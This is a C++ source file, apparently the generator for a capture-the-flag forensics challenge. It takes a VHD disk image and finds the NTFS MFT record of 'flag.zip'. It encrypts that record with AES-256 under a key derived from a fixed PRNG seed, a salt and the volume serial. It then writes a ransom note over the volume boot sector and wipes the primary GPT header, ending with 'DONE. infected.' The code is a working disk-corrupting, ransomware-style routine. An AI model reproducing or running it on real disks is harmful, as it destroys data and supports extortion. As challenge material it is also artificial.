#define NOMINMAX
#include <windows.h>
#include <bcrypt.h>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cctype>
#include <string>
#include <vector>
#include <fstream>
#include <iterator>
#include <cstring>
#include <algorithm>
#pragma comment(lib, "bcrypt.lib")

static const int32_t SEED = 956377;
static const char*   SALT = "yuneko_dev_";
static const size_t  REC  = 1024;

// ---- .NET new Random(seed) legacy subtractive PRNG ----
struct NetRandom {
    int32_t s[56]; int inext, inextp;
    explicit NetRandom(int32_t seed) {
        const int32_t MBIG = 2147483647, MSEED = 161803398;
        for (int i = 0; i < 56; i++) s[i] = 0;
        int32_t subtraction = (seed == INT32_MIN) ? MBIG : (seed < 0 ? -seed : seed);
        int32_t mj = MSEED - subtraction;
        s[55] = mj; int32_t mk = 1;
        for (int i = 1; i < 55; i++) {
            int ii = (21 * i) % 55;
            s[ii] = mk;
            mk = mj - mk;
            if (mk < 0) mk += MBIG;
            mj = s[ii];
        }
        for (int k = 0; k < 4; k++)
            for (int i = 1; i < 56; i++) {
                s[i] -= s[1 + (i + 30) % 55];
                if (s[i] < 0) s[i] += MBIG;
            }
        inext = 0; inextp = 21;
    }
    int32_t sample() {
        const int32_t MBIG = 2147483647;
        int li = inext + 1;  if (li >= 56) li = 1;
        int lp = inextp + 1; if (lp >= 56) lp = 1;
        int32_t ret = s[li] - s[lp];
        if (ret == MBIG) ret--;
        if (ret < 0) ret += MBIG;
        s[li] = ret; inext = li; inextp = lp;
        return ret;
    }
    std::vector<uint8_t> nextBytes(size_t n) {
        std::vector<uint8_t> b(n);
        for (size_t i = 0; i < n; i++) b[i] = (uint8_t)(sample() % 256);
        return b;
    }
};

// ---- CNG helpers ----
static std::vector<uint8_t> sha256(const std::vector<uint8_t>& data) {
    BCRYPT_ALG_HANDLE hAlg = 0; BCRYPT_HASH_HANDLE hHash = 0;
    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL, 0);
    BCryptCreateHash(hAlg, &hHash, NULL, 0, NULL, 0, 0);
    BCryptHashData(hHash, (PUCHAR)data.data(), (ULONG)data.size(), 0);
    std::vector<uint8_t> out(32);
    BCryptFinishHash(hHash, out.data(), 32, 0);
    BCryptDestroyHash(hHash); BCryptCloseAlgorithmProvider(hAlg, 0);
    return out;
}
static std::vector<uint8_t> aes256cbc_nopad(const std::vector<uint8_t>& key, std::vector<uint8_t> data) {
    BCRYPT_ALG_HANDLE hAlg = 0; BCRYPT_KEY_HANDLE hKey = 0;
    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
        (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)key.data(), (ULONG)key.size(), 0);
    UCHAR iv[16] = {0}; ULONG outLen = 0;
    std::vector<uint8_t> out(data.size());
    BCryptEncrypt(hKey, data.data(), (ULONG)data.size(), NULL, iv, 16,
                  out.data(), (ULONG)out.size(), &outLen, 0);   // flags=0 => no padding
    BCryptDestroyKey(hKey); BCryptCloseAlgorithmProvider(hAlg, 0);
    out.resize(outLen);
    return out;
}

static std::string hexUpper(const std::vector<uint8_t>& b) {
    static const char* H = "0123456789ABCDEF";
    std::string s; s.reserve(b.size() * 2);
    for (uint8_t x : b) { s.push_back(H[x >> 4]); s.push_back(H[x & 0xf]); }
    return s;
}
static std::vector<uint8_t> hexToBytes(const std::string& in) {
    std::string h; for (char c : in) if (isxdigit((unsigned char)c)) h.push_back(c);
    std::vector<uint8_t> out;
    for (size_t i = 0; i + 2 <= h.size(); i += 2)
        out.push_back((uint8_t)strtol(h.substr(i, 2).c_str(), nullptr, 16));
    return out;
}

// ---- file IO ----
struct Vhd {
    std::fstream f;
    explicit Vhd(const char* p) { f.open(p, std::ios::in | std::ios::out | std::ios::binary); }
    bool ok() { return f.is_open(); }
    std::vector<uint8_t> rd(uint64_t off, size_t n) {
        std::vector<uint8_t> b(n);
        f.seekg((std::streamoff)off, std::ios::beg);
        f.read((char*)b.data(), (std::streamsize)n);
        return b;
    }
    void wr(uint64_t off, const std::vector<uint8_t>& b) {
        f.seekp((std::streamoff)off, std::ios::beg);
        f.write((const char*)b.data(), (std::streamsize)b.size());
        f.flush();
    }
};
static uint16_t u16le(const std::vector<uint8_t>& b, size_t o) { return (uint16_t)(b[o] | (b[o + 1] << 8)); }
static uint64_t u64le(const std::vector<uint8_t>& b, size_t o) {
    uint64_t v = 0; for (int i = 0; i < 8; i++) v |= (uint64_t)b[o + i] << (8 * i); return v;
}
static long findBytes(const std::vector<uint8_t>& hay, const std::vector<uint8_t>& nee) {
    if (nee.empty() || hay.size() < nee.size()) return -1;
    auto it = std::search(hay.begin(), hay.end(), nee.begin(), nee.end());
    return it == hay.end() ? -1 : (long)(it - hay.begin());
}
static bool recordHasData(const std::vector<uint8_t>& r) {
    size_t a = u16le(r, 0x14);
    while (a + 8 <= r.size()) {
        uint32_t type = (uint32_t)(r[a] | (r[a+1] << 8) | (r[a+2] << 16) | ((uint32_t)r[a+3] << 24));
        if (type == 0xFFFFFFFF) break;
        uint32_t len = (uint32_t)(r[a+4] | (r[a+5] << 8) | (r[a+6] << 16) | ((uint32_t)r[a+7] << 24));
        if (len == 0 || a + len > r.size()) break;
        if (type == 0x80) return true;
        a += len;
    }
    return false;
}

int main(int argc, char** argv) {
#ifdef YUNEKO_DEV
    if (argc < 2) { printf("usage: encryptor <vhd> [--locate] | encryptor --key <serialHex>\n"); return 1; }

    // --key <serialHex> (= zip password)
    if (std::string(argv[1]) == "--key") {
        std::vector<uint8_t> serial = hexToBytes(argc > 2 ? argv[2] : "");
        std::vector<uint8_t> rb = NetRandom(SEED).nextBytes(32);
        std::vector<uint8_t> in(rb);
        for (const char* p = SALT; *p; ++p) in.push_back((uint8_t)*p);
        in.insert(in.end(), serial.begin(), serial.end());
        printf("%s\n", hexUpper(sha256(in)).c_str());
        return 0;
    }
    bool locate = (argc > 2 && std::string(argv[2]) == "--locate");
#else
    if (argc < 2) { printf("usage: encryptor <vhd>\n"); return 1; }
#endif
    Vhd v(argv[1]);
    if (!v.ok()) { printf("ERR: cannot open %s\n", argv[1]); return 1; }

    // 1. GPT partition entry[0] @ LBA2
    auto pe = v.rd(2 * 512, 128);
    uint64_t firstLBA = u64le(pe, 0x20), lastLBA = u64le(pe, 0x28);
    uint64_t partStart = firstLBA * 512;
    uint64_t partSizeSectors = lastLBA - firstLBA + 1;
    uint64_t backupVBR = partStart + (partSizeSectors - 1) * 512;

    // 2. VBR
    auto vbr = v.rd(partStart, 512);
    uint64_t bps = u16le(vbr, 0x0B), spc = vbr[0x0D], mftLCN = u64le(vbr, 0x30);
    std::vector<uint8_t> volSerial(vbr.begin() + 0x48, vbr.begin() + 0x50);
    uint64_t mftByte = partStart + mftLCN * spc * bps;

#ifdef YUNEKO_DEV
    printf("partStart =0x%llX\n", (unsigned long long)partStart);
    printf("mftByte   =0x%llX\n", (unsigned long long)mftByte);
    printf("backupVBR =0x%llX\n", (unsigned long long)backupVBR);
    printf("volSerial =%s  (little-endian)\n", hexUpper(volSerial).c_str());
#endif

    // 3. record 'flag.zip'
    auto mft = v.rd(mftByte, 512 * 1024);
    std::vector<uint8_t> needle;
    for (char c : std::string("flag.zip")) { needle.push_back((uint8_t)c); needle.push_back(0); }
    uint64_t recAbs = 0; bool found = false;
    for (size_t off = 0; off + REC <= mft.size(); off += REC) {
        if (!(mft[off]=='F' && mft[off+1]=='I' && mft[off+2]=='L' && mft[off+3]=='E')) continue;
        std::vector<uint8_t> rec0(mft.begin() + off, mft.begin() + off + REC);
        if (findBytes(rec0, needle) < 0) continue;
        if (!recordHasData(rec0)) continue;
        recAbs = mftByte + off; found = true; break;
    }
    if (!found) { printf("flag.zip DATA record NOT FOUND\n"); return 0; }
#ifdef YUNEKO_DEV
    printf("recAbs    =0x%llX\n", (unsigned long long)recAbs);
    if (locate) return 0;
#endif

    // 4. key = SHA256( Random(SEED).NextBytes(32) || SALT || volSerial )
    std::vector<uint8_t> in = NetRandom(SEED).nextBytes(32);
    for (const char* p = SALT; *p; ++p) in.push_back((uint8_t)*p);
    in.insert(in.end(), volSerial.begin(), volSerial.end());
    auto key = sha256(in);
#ifdef YUNEKO_DEV
    printf("KEY       =%s\n", hexUpper(key).c_str());
#endif

    // 5. AES-256-CBC IV=0 PadNone, enc record flag.zip
    auto rec = v.rd(recAbs, REC);
    auto ct = aes256cbc_nopad(key, rec);
    v.wr(recAbs, ct);

    // 6. VBR sector 0
    std::string serialHex = hexUpper(volSerial);
    std::string note;
    {
        std::string vp = argv[1];
        size_t slash = vp.find_last_of("/\\");
        std::string dir = (slash == std::string::npos) ? "." : vp.substr(0, slash);
        std::ifstream nf(dir + "/note.txt", std::ios::binary);
        if (nf) {
            std::string s((std::istreambuf_iterator<char>(nf)), std::istreambuf_iterator<char>());
            size_t pos;
            while ((pos = s.find("{SERIAL}")) != std::string::npos) s.replace(pos, 8, serialHex);
            note = s;
        } else {
            printf("[!] note.txt not found\n");
            return 1;
        }
    }
    std::vector<uint8_t> ransom(512, 0);
    size_t cl = std::min(note.size(), (size_t)512);
    memcpy(ransom.data(), note.data(), cl);
    v.wr(partStart, ransom);

    // 7. Primary GPT Header (LBA1)
    v.wr(512, std::vector<uint8_t>(512, 0));
    printf("DONE. infected.\n");
    return 0;
}
